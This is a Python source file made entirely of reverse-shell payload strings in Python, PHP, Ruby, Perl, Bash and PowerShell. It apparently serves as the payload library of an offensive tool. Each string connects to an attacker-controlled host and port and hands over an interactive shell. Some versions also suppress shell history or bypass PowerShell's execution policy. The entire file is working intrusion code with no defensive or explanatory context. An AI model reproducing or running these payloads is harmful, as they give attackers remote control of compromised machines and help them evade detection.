#!/usr/bin/env python

REV_PYTHON_TCP = """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """

REV_PYTHON_UDP = """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """

REV_PHP_TCP = """php -r "\$sock=fsockopen('TARGET',PORT);exec('/bin/sh -i <&3 >&3 2>&3');" """

REV_RUBY_TCP = """ruby -rsocket -e "exit if fork;c=TCPSocket.new('TARGET','PORT');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end" """

REV_PERL_TCP = """perl -e "use Socket;\$i='TARGET';\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};" """

REV_PERL_TCP_2 = """perl -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,'TARGET:PORT');STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;" """

BASH_TCP = """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""

#REV_POWERSHELL_TCP="""powershell -nop -ExecutionPolicy Bypass -Command ' = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = "$($sendback) PS $((pwd).Path) > ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' """

REV_POWERSHELL_TCP="""powershell -nop -ep bypass -Command '$ip="127.0.0.1";$port=1234;$client = New-Object System.Net.Sockets.TCPClient($ip, $port);$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"Windows PowerShell running as user \\" + $env:username + \\" on \\" + $env:computername + \\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\\");$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"PS \\" + (Get-Location).Path + \\"> \\");$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -command $returndata 2>&1 | Out-String ) } catch { Write-Warning \\"Something went wrong with execution of command on the target.\\"; Write-Error $_; }; $sendback = $result +  \\"PS \\" + (Get-Location).Path + \\"> \\"; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };'"""
